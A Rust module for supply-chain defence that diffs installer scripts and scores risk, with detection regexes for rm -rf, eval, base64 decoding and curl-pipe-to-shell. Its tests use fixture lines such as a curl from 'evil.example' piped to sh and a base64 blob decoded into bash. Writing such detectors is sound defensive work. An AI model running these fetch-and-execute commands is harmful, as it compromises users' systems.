//! Drift diff and risk scoring: what changed between the last known-good installer script and
//! the one now served, and whether a reviewer should worry.
//!
//! Features are named and deterministic (no model involved): new download hosts, changed URLs,
//! added `sudo` / `rm -rf` / `chmod 777` / `eval` / `base64 -d` / nested `curl … | sh`, opaque
//! high-entropy lines, size delta, and whether every change is confined to version strings.

use regex::Regex;
use serde::{Deserialize, Serialize};
use similar::{ChangeTag, TextDiff};
use std::collections::BTreeSet;
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RiskScore {
    /// Only version strings / pins changed (or nothing)
    Routine,
    /// Logic changed; needs a human look
    Review,
    /// Features associated with supply-chain compromise appeared
    Suspicious,
}

impl RiskScore {
    pub fn as_str(self) -> &'static str {
        match self {
            RiskScore::Routine => "routine",
            RiskScore::Review => "review",
            RiskScore::Suspicious => "suspicious",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct DriftReport {
    pub old_sha256: String,
    pub new_sha256: String,
    pub old_size: usize,
    pub new_size: usize,
    pub size_delta: i64,
    pub added_lines: usize,
    pub removed_lines: usize,
    /// Every change is a version-string change on an otherwise identical line
    pub version_only: bool,
    /// Human-readable triggering features (sorted, deduplicated)
    pub features: Vec<String>,
    pub score: RiskScore,
    /// Unified diff, capped at `preview_lines`
    pub unified_diff: String,
    pub diff_truncated: bool,
}

/// Maximum lines in the stored unified diff preview.
pub const PREVIEW_LINES: usize = 200;

fn re(cell: &'static OnceLock<Regex>, pat: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(pat).expect("valid regex"))
}

static URL_RE: OnceLock<Regex> = OnceLock::new();
static VERSION_RE: OnceLock<Regex> = OnceLock::new();
static CURL_PIPE_RE: OnceLock<Regex> = OnceLock::new();

fn hosts(text: &str) -> BTreeSet<String> {
    re(&URL_RE, r#"https?://([A-Za-z0-9.\-]+)"#)
        .captures_iter(text)
        .map(|c| c[1].to_ascii_lowercase())
        .collect()
}

fn urls(text: &str) -> BTreeSet<String> {
    re(&URL_RE, r#"https?://([A-Za-z0-9.\-]+)"#)
        .find_iter(text)
        .map(|m| {
            // Extend to the end of the URL token.
            let rest = &text[m.start()..];
            rest.split(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == ')' || c == '`')
                .next()
                .unwrap_or("")
                .to_string()
        })
        .collect()
}

/// Strip version-like tokens (v1.2.3, 1.2.3-beta.1, 20250101, sha-ish hex) so two lines that
/// differ only in versions compare equal.
fn normalize_versions(line: &str) -> String {
    re(&VERSION_RE, r"v?\d+(\.\d+){1,3}([-+][0-9A-Za-z.]+)?|\b\d{8}\b|\b[0-9a-f]{7,64}\b")
        .replace_all(line, "<v>")
        .into_owned()
}

fn shannon_entropy(s: &str) -> f64 {
    let bytes = s.as_bytes();
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let n = bytes.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

fn is_comment_or_blank(line: &str) -> bool {
    let t = line.trim();
    t.is_empty() || t.starts_with('#')
}

/// Compare two script texts.
pub fn analyze(old: &str, new: &str) -> DriftReport {
    let old_sha = super::ledger::sha256_hex(old.as_bytes());
    let new_sha = super::ledger::sha256_hex(new.as_bytes());
    let diff = TextDiff::from_lines(old, new);

    let mut added: Vec<String> = Vec::new();
    let mut removed: Vec<String> = Vec::new();
    for change in diff.iter_all_changes() {
        match change.tag() {
            ChangeTag::Insert => added.push(change.value().trim_end().to_string()),
            ChangeTag::Delete => removed.push(change.value().trim_end().to_string()),
            ChangeTag::Equal => {}
        }
    }

    let mut features: BTreeSet<String> = BTreeSet::new();
    let mut suspicious = false;

    // Version-only: every added line has a removed counterpart equal after version normalization,
    // and vice versa (comments/blank lines ignored).
    let added_code: Vec<&String> = added.iter().filter(|l| !is_comment_or_blank(l)).collect();
    let removed_code: Vec<&String> = removed.iter().filter(|l| !is_comment_or_blank(l)).collect();
    let norm_removed: BTreeSet<String> =
        removed_code.iter().map(|l| normalize_versions(l)).collect();
    let norm_added: BTreeSet<String> = added_code.iter().map(|l| normalize_versions(l)).collect();
    let version_only = !added_code.is_empty()
        && added_code.len() == removed_code.len()
        && norm_added == norm_removed
        && added_code.iter().zip(removed_code.iter()).any(|(a, b)| a != b);
    if version_only {
        features.insert("version strings changed only".into());
    }

    // Hosts / URLs.
    let old_hosts = hosts(old);
    let new_hosts = hosts(new);
    for h in new_hosts.difference(&old_hosts) {
        features.insert(format!("new download host {h}"));
        suspicious = true;
    }
    let old_urls = urls(old);
    let new_urls = urls(new);
    let changed_urls: Vec<&String> =
        new_urls.difference(&old_urls).filter(|u| hosts(u).is_subset(&old_hosts)).collect();
    if !changed_urls.is_empty() && !version_only {
        features.insert(format!("{} download URL(s) changed on known hosts", changed_urls.len()));
    }

    // Dangerous constructs in added lines.
    let added_text = added_code.iter().map(|s| s.as_str()).collect::<Vec<_>>().join("\n");
    let checks: [(&str, &str, bool); 6] = [
        (r"(?m)^\s*sudo\b|\bsudo\s", "added sudo", false),
        (r"rm\s+-rf?\s", "added rm -rf", true),
        (r"chmod\s+(-R\s+)?777", "added chmod 777", true),
        (r"\beval\b", "added eval", true),
        (r"base64\s+(-d|--decode)", "added base64 decode", true),
        (
            r"\bcurl\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b|\bwget\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b",
            "added nested curl | sh",
            true,
        ),
    ];
    let _ = &CURL_PIPE_RE;
    for (pat, label, is_suspicious) in checks {
        if Regex::new(pat).map(|r| r.is_match(&added_text)).unwrap_or(false) {
            features.insert(label.to_string());
            if is_suspicious {
                suspicious = true;
            }
        }
    }

    // Opaque blobs: long whitespace-free tokens that are almost entirely alphanumeric with high
    // entropy (base64 payloads). URLs and paths have too much punctuation; hex hashes too little
    // entropy.
    let opaque = added_code
        .iter()
        .filter(|l| {
            l.split_whitespace().any(|tok| {
                let punct = tok.chars().filter(|c| !c.is_ascii_alphanumeric()).count() as f64
                    / tok.len().max(1) as f64;
                tok.len() >= 40 && punct < 0.1 && shannon_entropy(tok) > 4.6
            })
        })
        .count();
    if opaque > 0 {
        features.insert(format!("{opaque} opaque high-entropy line(s) added"));
        suspicious = true;
    }

    let size_delta = new.len() as i64 - old.len() as i64;
    if size_delta.unsigned_abs() as usize > old.len().max(1) / 2 {
        features.insert(format!("size changed by {size_delta} bytes"));
    }

    let no_code_change = added_code.is_empty() && removed_code.is_empty();
    let score = if suspicious {
        RiskScore::Suspicious
    } else if no_code_change || version_only {
        RiskScore::Routine
    } else {
        RiskScore::Review
    };
    if score == RiskScore::Review {
        features.insert(format!(
            "{} line(s) added, {} removed",
            added_code.len(),
            removed_code.len()
        ));
    }

    let full = diff.unified_diff().context_radius(3).header("known-good", "served").to_string();
    let lines: Vec<&str> = full.lines().collect();
    let diff_truncated = lines.len() > PREVIEW_LINES;
    let unified_diff = lines.iter().take(PREVIEW_LINES).copied().collect::<Vec<_>>().join("\n");

    DriftReport {
        old_sha256: old_sha,
        new_sha256: new_sha,
        old_size: old.len(),
        new_size: new.len(),
        size_delta,
        added_lines: added.len(),
        removed_lines: removed.len(),
        version_only,
        features: features.into_iter().collect(),
        score,
        unified_diff,
        diff_truncated,
    }
}

/// One-line human summary.
pub fn summary(report: &DriftReport) -> String {
    format!(
        "{} (+{} -{} lines, {:+} bytes){}",
        report.score.as_str(),
        report.added_lines,
        report.removed_lines,
        report.size_delta,
        if report.features.is_empty() {
            String::new()
        } else {
            format!(": {}", report.features.join("; "))
        }
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const BASE: &str = "#!/bin/bash\nset -e\nVERSION=\"1.2.3\"\nURL=\"https://github.com/acme/tool/releases/download/v1.2.3/tool.tar.gz\"\ncurl -fsSL \"$URL\" -o /tmp/tool.tar.gz\ntar xzf /tmp/tool.tar.gz -C ~/.local/bin\n";

    #[test]
    fn identical_scripts_are_routine() {
        let r = analyze(BASE, BASE);
        assert_eq!(r.score, RiskScore::Routine);
        assert_eq!(r.added_lines, 0);
        assert!(r.features.is_empty());
    }

    #[test]
    fn version_bump_only_is_routine() {
        let new = BASE.replace("1.2.3", "1.3.0");
        let r = analyze(BASE, &new);
        assert_eq!(r.score, RiskScore::Routine, "{r:?}");
        assert!(r.version_only);
        assert_eq!(r.added_lines, 2);
        assert!(r.unified_diff.contains("-VERSION=\"1.2.3\""));
        assert!(r.unified_diff.contains("+VERSION=\"1.3.0\""));
        assert!(summary(&r).starts_with("routine"));
    }

    #[test]
    fn nested_curl_pipe_sh_to_a_new_host_is_suspicious() {
        let new = format!("{BASE}curl -fsSL https://evil.example/payload.sh | sh\n");
        let r = analyze(BASE, &new);
        assert_eq!(r.score, RiskScore::Suspicious, "{r:?}");
        assert!(
            r.features.iter().any(|f| f.contains("new download host evil.example")),
            "{:?}",
            r.features
        );
        assert!(r.features.iter().any(|f| f.contains("nested curl | sh")), "{:?}", r.features);
    }

    #[test]
    fn opaque_blob_and_base64_decode_are_suspicious() {
        let blob =
            "QmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IGxvb2tzIG9wYXF1ZSB0byBhIHJldmlld2VyISEhISEhIQ==";
        let new = format!("{BASE}echo {blob} | base64 -d | bash\n");
        let r = analyze(BASE, &new);
        assert_eq!(r.score, RiskScore::Suspicious);
        assert!(r.features.iter().any(|f| f.contains("base64 decode")));
        assert!(r.features.iter().any(|f| f.contains("opaque high-entropy")), "{:?}", r.features);
    }

    #[test]
    fn logic_change_without_red_flags_needs_review() {
        let new = BASE.replace(
            "tar xzf /tmp/tool.tar.gz -C ~/.local/bin",
            "mkdir -p ~/.local/bin\ntar xzf /tmp/tool.tar.gz -C ~/.local/bin\necho installed",
        );
        let r = analyze(BASE, &new);
        assert_eq!(r.score, RiskScore::Review, "{r:?}");
        assert!(!r.version_only);
        assert!(r.features.iter().any(|f| f.contains("line(s) added")));
        // sudo alone is a review-level feature, not suspicious.
        let sudo = format!("{BASE}sudo apt-get install -y jq\n");
        let r = analyze(BASE, &sudo);
        assert_eq!(r.score, RiskScore::Review);
        assert!(r.features.iter().any(|f| f == "added sudo"));
    }

    #[test]
    fn huge_diffs_are_truncated_in_the_preview() {
        let new: String = (0..500).map(|i| format!("echo line {i}\n")).collect();
        let r = analyze(BASE, &new);
        assert!(r.diff_truncated);
        assert!(r.unified_diff.lines().count() <= PREVIEW_LINES);
        assert!(r.features.iter().any(|f| f.starts_with("size changed by")));
    }
}
